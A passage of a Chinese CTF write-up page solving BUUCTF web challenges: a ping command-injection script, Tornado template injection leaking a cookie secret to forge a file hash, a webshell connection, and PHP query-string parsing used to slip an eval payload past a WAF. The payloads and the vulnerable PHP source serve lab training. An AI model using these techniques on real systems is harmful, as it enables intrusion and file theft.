+<p><img alt="image-20210119224136452" src="../images/buuctf-excrcise2/image-20210119224136452.png" /></p>
+<p>可以执行命令  ls</p>
+<p><img alt="image-20210119224242879" src="../images/buuctf-excrcise2/image-20210119224242879.png" /></p>
+<p>查看index.php文件内容</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> 
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 3 &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;target&#39;</span><span class="p">]);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+<p>得知没有做任何限制</p>
+<p><img alt="image-20210119224516182" src="../images/buuctf-excrcise2/image-20210119224516182.png" /></p>
+<p>flag存在根目录下</p>
+<p><img alt="image-20210119224552674" src="../images/buuctf-excrcise2/image-20210119224552674.png" /></p>
+<h2 id="3-2018-easy_tornado">3 护网杯 2018 easy_tornado<a class="headerlink" href="#3-2018-easy_tornado" title="Permanent link">&para;</a></h2>
+<p>本题目考察模板注入</p>
+<p><strong>参考<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">ssti模板注入</a></strong></p>
+<p>三个文件的内容：</p>
+<div class="highlight"><pre><span></span><code>/flag.txt
+flag in /fllllllllllllag
+
+/welcome.txt
+render
+
+/hints.txt
+md5(cookie_secret+md5(filename))
+</code></pre></div>
+<p>根据题目提示，flag在fllllllllllllag文件中，但是目前不知道fllllllllllllag的filehash</p>
+<p><code>file?filename=/fllllllllllllag&amp;filehash=b7ff1f18cbd7a5b4a2bbac4b3932682a</code></p>
+<p><img alt="image-20210119225919974" src="../images/buuctf-excrcise2/image-20210119225919974.png" /></p>
+<p>由于提示模板注入，测试，操作符被过滤</p>
+<div class="highlight"><pre><span></span><code>error?msg={{8}}
+&gt;&gt; 8
+
+error?msg={{8*9}}
+&gt;&gt; ORZ
+</code></pre></div>
+<p>tornado通过模板注入用handler.settings对象可以获取cookie</p>
+<div class="highlight"><pre><span></span><code>error?msg={{handler.settings}}
+
+{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;a5bb9a91-55c8-4c78-9b26-ca07b50fda5f&#39;} 
+</code></pre></div>
+<p><img alt="image-20210119233008327" src="../images/buuctf-excrcise2/image-20210119233008327.png" /></p>
+<p>根据前面的提示，<code>md5(cookie_secret+md5(filename))</code></p>
+<p>因此可以得到fllllllllllllag的filehash</p>
+<p>md5(/fllllllllllllag) = 3bf9f6cf685a6dd8defadabfb41a03a1</p>
+<p>filehash=md5(a5bb9a91-55c8-4c78-9b26-ca07b50fda5f3bf9f6cf685a6dd8defadabfb41a03a1)=f9b967034472207aa5900e5dd923a310</p>
+<p>payload:</p>
+<div class="highlight"><pre><span></span><code>file?filename=/fllllllllllllag&amp;filehash=f9b967034472207aa5900e5dd923a310
+</code></pre></div>
+<p>成功得到flag</p>
+<p><img alt="image-20210119235025080" src="../images/buuctf-excrcise2/image-20210119235025080.png" /></p>
+<h2 id="4-2019-knife">4 极客大挑战 2019 Knife<a class="headerlink" href="#4-2019-knife" title="Permanent link">&para;</a></h2>
+<p>根据提示连接一句话，然后根目录可以翻到flag</p>
+<p><img alt="image-20210119235721183" src="../images/buuctf-excrcise2/image-20210119235721183.png" /></p>
+<h2 id="5-roarctf-2019-easy-calc">5 RoarCTF 2019 Easy Calc<a class="headerlink" href="#5-roarctf-2019-easy-calc" title="Permanent link">&para;</a></h2>
+<p>查看页面源代码</p>
+<div class="highlight"><pre><span></span><code><span class="c">&lt;!--</span><span class="nx">I</span><span class="s1">&#39;ve set up WAF to ensure security.--&gt;</span>
+<span class="s1">&lt;script&gt;</span>
+<span class="s1">    $(&#39;</span><span class="err">#</span><span class="nx">calc</span><span class="s1">&#39;).submit(function(){</span>
+<span class="s1">        $.ajax({</span>
+<span class="s1">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span>
+<span class="s1">            type:&#39;</span><span class="nx">GET</span><span class="err">&#39;</span><span class="p">,</span>
+            <span class="nx">success</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span>
+                <span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#result&quot;</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="sb">`&lt;div class=&quot;alert alert-success&quot;&gt;</span>
+<span class="sb">            &lt;strong&gt;答案:&lt;/strong&gt;</span><span class="si">${</span><span class="nx">data</span><span class="si">}</span><span class="sb"></span>
+<span class="sb">            &lt;/div&gt;`</span><span class="p">);</span>
+            <span class="p">},</span>
+            <span class="nx">error</span><span class="o">:</span><span class="kd">function</span><span class="p">(){</span>
+                <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;这啥?算不来!&quot;</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">})</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">})</span>
+<span class="o">&lt;</span><span class="err">/script&gt;</span>
+</code></pre></div>
+<h4 id="2-contentval">知识点2 $("#content").val() ：<a class="headerlink" href="#2-contentval" title="Permanent link">&para;</a></h4>
+<p>获取id为content的HTML标签元素的值,是JQuery,   $("#content")相当于document.getElementById("content");    $("#content").val()相当于 document.getElementById("content").value;</p>
+<h4 id="2-php">知识点2 PHP的字符串解析特性<a class="headerlink" href="#2-php" title="Permanent link">&para;</a></h4>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
+<p>1.删除空白符 </p>
+<p>2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
+<p><strong>例1 ：</strong></p>
+<p>/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>
+<p><strong>例2：</strong></p>
+<p>/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>
+<p><code>/news.php?%20news[id%00=42"+AND+1=0–</code></p>
+<h4 id="3-scandir">知识点3 scandir()<a class="headerlink" href="#3-scandir" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code>scandir — 列出指定路径中的文件和目录
+
+
+说明 
+
+scandir( string $directory[, int $sorting_order[, resource $context]] ) : array
+
+返回一个 array，包含有 directory 中的文件和目录。
+</code></pre></div>
+<h4 id="php">方法一：利用php解析特性<a class="headerlink" href="#php" title="Permanent link">&para;</a></h4>
+<p><img alt="image-20210120003423746" src="../images/buuctf-excrcise2/image-20210120003423746.png" /></p>
+<p>过滤了\，使用chr(47)代替</p>
+<p><img alt="image-20210120003744995" src="../images/buuctf-excrcise2/image-20210120003744995.png" /></p>
+<p>根目录存在f1agg文件</p>
+<p>注意：文件名中是1二不是l</p>
+<p>payload:</p>
+<p><code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
+<p><img alt="image-20210120004616955" src="../images/buuctf-excrcise2/image-20210120004616955.png" /></p>
+<h4 id="http">方法二：http走私<a class="headerlink" href="#http" title="Permanent link">&para;</a></h4>
+<p>http走私</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
+    <span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
+        <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;\t&#39;</span><span class="p">,</span> <span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;\n&#39;</span><span class="p">,</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">,</span><span class="s1">&#39;\$&#39;</span><span class="p">,</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span><span class="s1">&#39;\^&#39;</span><span class="p">];</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/m&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
+                        <span class="k">die</span><span class="p">(</span><span class="s2">&quot;what are you want to do?&quot;</span><span class="p">);</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"> </span>
+</code></pre></div>
+<p>可以看到源代码</p>
+<p><img alt="image-20210120001622118" src="../images/buuctf-excrcise2/image-20210120001622118.png" /></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../buuctf-excrcise/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                buuctf-web题练习1
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../buuctf-excrcise3/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                buuctf-web题练习3
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.6a3d08fc.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.71201edf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: ['navigation.instant', 'navigation.tabs', 'navigation.tabs.sticky'],
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.4ac00218.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+        <script src="../../../js/extra.js"></script>
+      
+        <script src="../../../js/baidu-tongji.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+      
+    
+  </body>
+</html>
